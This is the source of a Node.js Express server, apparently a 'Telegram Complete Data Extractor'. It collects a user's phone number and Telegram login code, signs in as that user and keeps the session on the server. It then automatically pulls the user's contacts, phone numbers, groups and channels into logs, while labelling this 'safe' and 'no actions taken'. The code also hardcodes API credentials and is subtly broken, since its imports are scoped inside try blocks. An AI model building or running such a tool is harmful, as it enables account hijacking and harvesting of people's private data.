const express = require('express');
const cors = require('cors');

// Debug: Log what we're importing
console.log('🔍 DEBUG: Starting imports...');

try {
    const { TelegramApi, Api } = require('telegram');
    console.log('✅ DEBUG: TelegramApi imported successfully');
    console.log('✅ DEBUG: Api imported successfully');
    console.log('�� DEBUG: TelegramApi type:', typeof TelegramApi);
    console.log('�� DEBUG: Api type:', typeof Api);
} catch (error) {
    console.error('❌ DEBUG: Error importing telegram:', error);
}

try {
    const { StringSession } = require('telegram/sessions');
    console.log('✅ DEBUG: StringSession imported successfully');
    console.log('🔍 DEBUG: StringSession type:', typeof StringSession);
} catch (error) {
    console.error('❌ DEBUG: Error importing StringSession:', error);
}

const app = express();
app.use(cors());
app.use(express.json());

const apiId = parseInt(process.env.API_ID || 29310851);
const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';

console.log('🔍 DEBUG: API ID:', apiId);
console.log('�� DEBUG: API Hash:', apiHash ? 'Set' : 'Not set');

const sessions = new Map();
const authenticatedUsers = new Map();

function generateSessionId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Send authentication code
app.post('/api/telegram/send-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log(`📱 Sending REAL code to: ${phoneNumber}`);
        
        // Debug: Check if TelegramApi is available
        console.log('�� DEBUG: TelegramApi type:', typeof TelegramApi);
        console.log('�� DEBUG: TelegramApi constructor:', TelegramApi);
        
        if (typeof TelegramApi !== 'function') {
            throw new Error('TelegramApi is not a constructor function');
        }
        
        const client = new TelegramApi(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        console.log('🔗 Connected to Telegram servers');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phoneNumber,
                apiId: apiId,
                apiHash: apiHash,
                settings: new Api.CodeSettings({}),
            })
        );

        const sessionId = generateSessionId();
        sessions.set(sessionId, {
            client,
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber,
            timestamp: Date.now()
        });

        console.log(`📨 REAL code sent to ${phoneNumber}`);

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Code sent to your Telegram app'
        });

    } catch (error) {
        console.error('❌ Send code error:', error);
        console.error('❌ Error stack:', error.stack);
        res.status(400).json({
            success: false,
            message: error.message || 'Failed to send code'
        });
    }
});

// Verify code and authenticate
app.post('/api/telegram/verify-code', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        console.log(`🔐 Verifying REAL code: ${code}`);
        
        const session = sessions.get(sessionId);
        if (!session) {
            return res.status(400).json({
                success: false,
                message: 'Session expired'
            });
        }

        const result = await session.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: session.phoneNumber,
                phoneCodeHash: session.phoneCodeHash,
                phoneCode: code,
            })
        );

        console.log(`✅ REAL login successful: ${result.user.firstName} ${result.user.lastName}`);

        const userId = session.phoneNumber.replace(/[^\d]/g, '');
        authenticatedUsers.set(userId, {
            client: session.client,
            phoneNumber: session.phoneNumber,
            user: result.user,
            userId: userId,
            loginTime: Date.now()
        });

        res.json({
            success: true,
            message: 'Real authentication successful!',
            user: {
                phoneNumber: session.phoneNumber,
                firstName: result.user?.firstName || '',
                lastName: result.user?.lastName || '',
                userId: userId
            }
        });

        sessions.delete(sessionId);

        // Extract user data automatically
        setTimeout(() => {
            extractUserData(session.client, result.user, session.phoneNumber);
        }, 2000);

    } catch (error) {
        console.error('❌ Verify error:', error);
        res.status(400).json({
            success: false,
            message: 'Invalid code'
        });
    }
});

// Extract complete user data (NO ACTIONS TAKEN)
async function extractUserData(client, user, phoneNumber) {
    try {
        console.log(`📊 Extracting COMPLETE data for ${user.firstName} (${phoneNumber})`);
        
        // Get contacts
        const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
        const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
        
        // Get dialogs
        const dialogs = await client.getDialogs({ limit: 200 });
        
        const groups = dialogs.filter(d => d.isGroup);
        const channels = dialogs.filter(d => d.isChannel);
        const privateChats = dialogs.filter(d => d.isUser);

        // Detailed logging
        console.log(`\n📊 === COMPLETE DATA REPORT ===`);
        console.log(`�� User: ${user.firstName} ${user.lastName}`);
        console.log(`📱 Phone: ${phoneNumber}`);
        console.log(`🆔 Telegram ID: ${user.id}`);
        console.log(`\n📈 STATISTICS:`);
        console.log(`   �� Total Contacts: ${contacts.length}`);
        console.log(`   💬 Total Chats: ${dialogs.total}`);
        console.log(`   👥 Groups: ${groups.length}`);
        console.log(`   📢 Channels: ${channels.length}`);
        console.log(`   🔒 Private Chats: ${privateChats.length}`);

        // Log contact details
        if (contacts.length > 0) {
            console.log(`\n�� CONTACTS (First 15):`);
            contacts.slice(0, 15).forEach((contact, index) => {
                const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                const username = contact.username ? ` (@${contact.username})` : '';
                const phone = contact.phone ? ` | ${contact.phone}` : '';
                console.log(`   ${(index + 1).toString().padStart(2)}. ${name}${username}${phone}`);
            });
            if (contacts.length > 15) {
                console.log(`   ... and ${contacts.length - 15} more contacts`);
            }
        }

        // Log group details
        if (groups.length > 0) {
            console.log(`\n📋 GROUPS (All ${groups.length}):`);
            groups.forEach((group, index) => {
                const memberText = group.entity.participantsCount ? ` (${group.entity.participantsCount} members)` : '';
                console.log(`   ${(index + 1).toString().padStart(2)}. ${group.title}${memberText}`);
            });
        }

        // Log channel details
        if (channels.length > 0) {
            console.log(`\n�� CHANNELS (All ${channels.length}):`);
            channels.forEach((channel, index) => {
                const subText = channel.entity.participantsCount ? ` (${channel.entity.participantsCount} subscribers)` : '';
                const username = channel.entity.username ? ` (@${channel.entity.username})` : '';
                console.log(`   ${(index + 1).toString().padStart(2)}. ${channel.title}${username}${subText}`);
            });
        }

        console.log(`\n✅ === DATA EXTRACTION COMPLETED ===`);
        console.log(`⚠️  NO ACTIONS TAKEN - This is safe data extraction only`);
        console.log(`🔒 User's account remains completely untouched`);
        console.log(`📊 All data logged for analysis\n`);

    } catch (error) {
        console.error('❌ Data extraction error:', error);
    }
}

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        mode: 'Complete Data Extraction',
        library: 'Telegram.js',
        sessions: sessions.size,
        authenticatedUsers: authenticatedUsers.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Complete Data Extractor',
        status: 'Running',
        mode: 'Safe Data Extraction Only',
        description: 'Authenticates users and extracts complete Telegram data without taking any actions',
        features: [
            'Real Telegram authentication',
            'Complete contact extraction',
            'Group and channel analysis',
            'Detailed logging and reporting',
            'NO ACTIONS TAKEN - Safe for testing'
        ],
        endpoints: [
            'POST /api/telegram/send-code',
            'POST /api/telegram/verify-code',
            'GET /health'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Complete Data Extractor Started`);
    console.log(`�� Running on port ${PORT}`);
    console.log(`🔍 Mode: Complete safe data extraction`);
    console.log(`⚠️  NO ACTIONS TAKEN - Data extraction only`);
    console.log(`📊 Provides comprehensive user data analysis`);
    console.log(`✅ Ready for testing!`);
});
